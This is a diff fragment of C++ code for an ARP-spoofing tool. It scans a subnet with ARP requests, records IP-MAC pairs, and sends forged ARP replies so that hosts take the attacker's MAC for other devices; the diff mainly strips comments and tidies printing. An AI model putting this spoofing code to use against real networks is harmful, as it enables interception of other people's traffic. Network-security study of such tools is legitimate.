@@ -1,9 +1,5 @@
-#include "arp.hpp"
+#include "arp.h"
 
-/*
-Save the available devices' IP and MAC into IP-MAC pair
-Print the available devices' IP and MAC
-*/
 void parseARPReply(uint8_t *buffer, std::map<std::vector<uint8_t>, std::vector<uint8_t>> &ip_mac_pairs, AccessInfo info) {
     arp_hdr arphdr = *reinterpret_cast<arp_hdr*>(buffer + ETH_HDRLEN);
 
@@ -49,25 +45,19 @@ void parseARPReply(uint8_t *buffer, std::map<std::vector<uint8_t>, std::vector<u
         // Print source IP address
         printf("%d.%d.%d.%d\t\t", arphdr.sender_ip[0], arphdr.sender_ip[1], arphdr.sender_ip[2], arphdr.sender_ip[3]);
         // Print source MAC address
-        for (int i = 0; i < 5; i++) {
-            printf("%02x:", arphdr.sender_mac[i]);
-        }
-        printf("%02x\n", arphdr.sender_mac[5]);
+        printf("%02x:%02x:%02x:%02x:%02x:%02x\n", arphdr.sender_mac[0], arphdr.sender_mac[1], arphdr.sender_mac[2], arphdr.sender_mac[3], arphdr.sender_mac[4], arphdr.sender_mac[5]);
     }
 }
 
-/*
-Function to send fake ARP replies
-Make the devices in the IP-MAC pair think that the other devices' MAC address is the attacker's MAC address
- */
+
 void sendSpoofedARPReply(int sd, std::map<std::vector<uint8_t>, std::vector<uint8_t>> &ip_mac_pairs, AccessInfo info) {
     arp_hdr arphdr;
-    arphdr.htype = htons(1);                    // Hardware type (16 bits): 1 for ethernet
-    arphdr.ptype = htons(ETH_P_IP);             // Protocol type (16 bits): 2048 for IP
-    arphdr.hlen = 6;                            // Hardware address length (8 bits): 6 bytes for MAC address
-    arphdr.plen = 4;                            // Protocol address length (8 bits): 4 bytes for IPv4 address
-    arphdr.opcode = htons(ARPOP_REPLY);         // OpCode: 2 for ARP reply
-    int frame_length = 6 + 6 + 2 + ARP_HDRLEN;  // Ethernet frame length = ethernet header (MAC + MAC + ethernet type) + ethernet data (ARP header)
+    arphdr.htype = htons(1);                    
+    arphdr.ptype = htons(ETH_P_IP);             
+    arphdr.hlen = 6;                            
+    arphdr.plen = 4;                            
+    arphdr.opcode = htons(ARPOP_REPLY);         
+    int frame_length = 6 + 6 + 2 + ARP_HDRLEN;  
     std::vector<uint8_t> ether_frame(IP_MAXPACKET);
 
     ether_frame[12] = ETH_P_ARP / 256;
@@ -107,10 +97,7 @@ void sendSpoofedARPReply(int sd, std::map<std::vector<uint8_t>, std::vector<uint
     }
 }
 
-/*
-Function to send ARP request to the whole subnet
-Used to get the MAC address and IP of all devices in the subnet
-*/
+
 void sendARPRequest(int sd, AccessInfo info) {
     int frame_length;
     int bytes;
@@ -130,25 +117,24 @@ void sendARPRequest(int sd, AccessInfo info) {
     info.device.sll_halen = htons(6);
 
     // ARP header
-    arphdr.htype = htons(1);                                                                     // Hardware type (16 bits): 1 for ethernet
-    arphdr.ptype = htons(ETH_P_IP);                                                              // Protocol type (16 bits): 2048 for IP
-    arphdr.hlen = 6;                                                                             // Hardware address length (8 bits): 6 bytes for MAC address
-    arphdr.plen = 4;                                                                             // Protocol address length (8 bits): 4 bytes for IPv4 address
-    arphdr.opcode = htons(ARPOP_REQUEST);                                                        // OpCode: 1 for ARP request
+    arphdr.htype = htons(1);                                                                     
+    arphdr.ptype = htons(ETH_P_IP);                                                              
+    arphdr.hlen = 6;                                                                             
+    arphdr.plen = 4;                                                                             
+    arphdr.opcode = htons(ARPOP_REQUEST);                                                        
     // arphdr.sender_mac.assign(info.src_mac.begin(), info.src_mac.end());
     std::copy(info.src_mac.begin(), info.src_mac.end(), arphdr.sender_mac);
     // printf("sender_mac: %02x:%02x:%02x:%02x:%02x:%02x\n", arphdr.sender_mac[0], arphdr.sender_mac[1], arphdr.sender_mac[2], arphdr.sender_mac[3], arphdr.sender_mac[4], arphdr.sender_mac[5]);
-    std::fill(arphdr.target_mac, arphdr.target_mac + 6, 0);                                      // Target hardware address (48 bits): zero
+    std::fill(arphdr.target_mac, arphdr.target_mac + 6, 0);                                      
 
     // Fill out ethernet frame header.
-    frame_length = ETH_HDRLEN + ARP_HDRLEN;  // Ethernet frame length = ethernet header (MAC + MAC + ethernet type) + ethernet data (ARP header)
+    frame_length = ETH_HDRLEN + ARP_HDRLEN; 
 
     // Destination and Source MAC addresses
     std::copy(dst_mac.begin(), dst_mac.end(), ether_frame.begin());
     std::copy(info.src_mac.begin(), info.src_mac.end(), ether_frame.begin() + 6);
 
     // Ethernet type code (ETH_P_ARP for ARP).
-    // http://www.iana.org/assignments/ethernet-numbers
     ether_frame[12] = ETH_P_ARP / 256;
     ether_frame[13] = ETH_P_ARP % 256;
     uint32_t base_ip_net = ntohl(info.src_ip.sin_addr.s_addr) & ntohl(info.netmask.sin_addr.s_addr);
